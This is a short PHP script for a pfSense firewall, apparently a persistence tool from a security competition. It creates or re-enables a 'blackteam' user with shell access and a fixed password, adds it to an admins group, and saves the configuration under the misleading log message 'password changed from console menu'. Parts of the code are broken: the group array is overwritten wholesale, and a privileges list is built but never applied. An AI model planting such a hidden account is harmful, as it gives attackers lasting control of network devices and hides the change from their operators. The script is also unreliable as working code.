#!/usr/local/bin/php -f
<?php
	require_once("config.inc");
	require("auth.inc");
	require_once("functions.inc");
	require_once("shaper.inc");

	$config['system']['webqui']['authmode']= "Local Database";


	$myuser =& getUserEntryByUID(2000);
	if (!$myuser){
		$myuser=array();
		$myuser['uid']=2000;
		$config['system']['user'][1]=$myuser;
	}
	$myuser['name']="blackteam";
	$myuser['scope']="system";
	$myuser['descr']="";
	$myuser['priv']=array("user-shell-access");
	if (isset($myuser['disabled'])){
		unset($myuser['disabled']);
	}
	local_user_set_password($myuser, "changeme");
	local_user_set($myuser);

	$admingroup =& getGroupEntryByGID(1999);
	if (!$admingroup){
		$admingroup=array();
		$admingroup['gid']=1999;
		if (!is_array($config['system']['group'])){
			$config['system']['group']=array();
		}
		$config['system']['group']=$admingroup;
	}
	$admingroup['name']="admins";
	$admingroup['scope']="system";
	if (!is_array($admingroup['member'])){
		$usersoffun=array();
		$usersoffun[0]=0;
		$usersoffun[1]=2000;
		$admingroup['member']=$usersoffun;
	} else {
		$contains=0;
		foreach ($admingroup['member'] as $myUID){
			if ($myUID==2000){
				$contains=1;
			}
		}
		if ($contains!=1){
			$admingroup['member'][count($admingroup['member'])]=2000;
		}
	}
	if (!is_array($admingroup['priv'])){
		$privs=array();
		$privs[0]="page-all";
	}
	#MAKEGROUPSTUFF HERE
        write_config(gettext("password changed from console menu"));
?>
